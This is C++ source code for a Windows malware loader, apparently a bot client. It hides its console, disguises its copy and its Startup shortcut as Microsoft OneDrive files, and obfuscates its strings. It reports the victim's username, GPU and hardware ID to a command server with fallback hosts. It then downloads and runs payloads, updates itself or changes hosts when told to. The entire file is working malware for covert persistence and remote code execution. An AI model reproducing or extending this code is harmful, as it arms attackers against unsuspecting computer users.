#include "Tools.h"
#include <thread>
#include <chrono>
#pragma comment(lib, "Ws2_32.lib")

TCHAR szMainFile[MAX_PATH + 1];
TCHAR szPingFile[MAX_PATH + 1];
TCHAR szLnkFile[MAX_PATH + 1];
TCHAR szAppdata[MAX_PATH + 1];
TCHAR szKeys[MAX_PATH + 1];

auto HOST = "127.0.0.1";

void Restart(LPCSTR argv, bool ForceClose) {
	if (!ForceClose) ShellExecute(NULL, XorStr("open"), argv, NULL, NULL, SW_SHOWDEFAULT);
	TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, GetCurrentProcessId()), 0);
}

void Client(LPCSTR argv) {
	bool NewHost = false;
	int AllConnectiosFailed = 0;
	while (true) {
		WSADATA wsaver;
		WSAStartup(MAKEWORD(2, 2), &wsaver);
		SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(HOST);
		addr.sin_port = htons(PORT);
		int NewHostIterator = 0;
		bool ErrorConection = false;
		while (true) {
			#ifdef _DEBUG
						print(HOST);
			#endif
			if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR)
			{
				AllConnectiosFailed += 1;
				#ifdef _DEBUG
								print("Not connected...");
				#endif
				std::this_thread::sleep_for(std::chrono::seconds(3));


				if (NewHost && NewHostIterator >= 15) {
					Restart(argv, false);  
				}
				else if (AllConnectiosFailed <= 15){
					#ifdef _DEBUG
										print("Using backup host...");
					#endif
					char szNewHost[255] = "";
					GetBackUpHost(szNewHost);
					szNewHost[strlen(szNewHost) - 1] = 0;
					HOST = szNewHost;
					ErrorConection = true;
					break;
				}
				else{
					Restart(argv, false);
				}

				NewHostIterator += 1;
				continue;
			}
			#ifdef _DEBUG
						print("Connected...");
			#endif
			if (NewHost) NewHost = false;
			ErrorConection = false;
			break;
		}

		if (ErrorConection) continue;


		char username[255] = "";
		char gpu[255] = "";
		char hwid[255] = "";

		_GetUserName(username);
		_GetGPU(gpu);
		_GetHwid(hwid);

		char* Info = new char[strlen(username) + strlen(gpu) + strlen(hwid) + 6];
		strcat(strcat(strcat(strcat(strcat(strcat(strcpy(Info, username), "@"), gpu), "@"), hwid), "@"), VERSION); //shit

		memset(username, 0, sizeof(username));
		memset(gpu, 0, sizeof(gpu));
		memset(hwid, 0, sizeof(hwid));

		send(tcpsock, Info, strlen(Info) + 1, 0);

		#ifdef _DEBUG
				print("Login");
				print(Info);
		#endif

		memset(Info, 0, sizeof(Info));

		char CommandReceived[DEFAULT_BUFLEN] = "";
		bool UrlNext = false;
		bool BuildUrlNext = false;
		while (true) {
			int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);

			#ifdef _DEBUG
						print("Received");
						print(CommandReceived);
			#endif


			if (strlen(CommandReceived) == 0) break;

			if ((strcmp(CommandReceived, XorStr("ping")) == 0)) {}
			else if ((strcmp(CommandReceived, XorStr("url")) == 0))
			{
				UrlNext = true; 
			}
			else if ((strcmp(CommandReceived, XorStr("build")) == 0))
			{
				BuildUrlNext = true;
			}
			else if ((strcmp(CommandReceived, XorStr("cancel")) == 0))
			{
				UrlNext = false;
				NewHost = false;
				BuildUrlNext = false;
			}
			else if ((strcmp(CommandReceived, XorStr("exit")) == 0))
			{
				Restart(argv, true);
			}
			else if ((strcmp(CommandReceived, XorStr("host")) == 0))
			{
				NewHost = true;
			}
			else if ((strcmp(CommandReceived, XorStr("reload")) == 0))
			{
				DeleteOldFiles();
				Restart(argv, false);
			}
			else if (UrlNext) {
				DownloadAndStart(CommandReceived);
				UrlNext = false;
			}
			else if (BuildUrlNext) {
				BuildUrlNext = false;
				DeleteOldFiles();
				DownloadAndStart(CommandReceived);
				Restart(argv, true);
			}
			else if (NewHost) {
				HOST = CommandReceived;
				break;
			}
			memset(CommandReceived, 0, sizeof(CommandReceived));
			send(tcpsock, XorStr("Good"), 5, 0);
		}
	}
}

int main(int argc, char* argv[]) {
	#ifndef _DEBUG
		ShowWindow(GetConsoleWindow(), HIDE_WINDOW);
		std::this_thread::sleep_for(std::chrono::seconds(5));
	#else 
		print("Stealthed...");
		print("Sleep 5 seconds...");
	#endif

	SHGetFolderPath(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, szAppdata);

	lstrcpy(szMainFile, szAppdata);
	lstrcat(szMainFile, XorStr("\\Microsoft\\Crypto\\Keys\\Microsoft OneDrive StandaloneUpdater_"));
	char* randomName = (char*)malloc(11);
	RandomString(randomName, 5);
	lstrcat(szMainFile, randomName);
	lstrcat(szMainFile, XorStr(".exe"));

	lstrcpy(szKeys, szAppdata);
	lstrcat(szKeys, XorStr("\\Microsoft\\Crypto\\Keys\\"));


	lstrcpy(szPingFile, szAppdata);
	lstrcat(szPingFile, XorStr("\\Microsoft\\Crypto\\Keys\\KEYSCOM.ini"));

	SHGetFolderPath(NULL, CSIDL_STARTUP | CSIDL_FLAG_CREATE, NULL, 0, szLnkFile);
	lstrcat(szLnkFile, XorStr("\\Microsoft OneDrive.lnk"));


	auto StartedTime = (int)time(NULL);
	#ifdef _DEBUG
		print("Started...");
		print(StartedTime);
	#endif

	AutoRun();
	std::thread thread(Client, argv[0]);


	while (true) {
		auto CurrentTime = (int)time(NULL);
		if (CurrentTime > StartedTime + TTR) {

			Restart(argv[0], false);
		}
		else { 
			#ifdef _DEBUG
						print("Time to restart");
						print((StartedTime + TTR) - CurrentTime);
			#endif
			std::this_thread::sleep_for(std::chrono::seconds((StartedTime + TTR) - CurrentTime));
		}
	}

}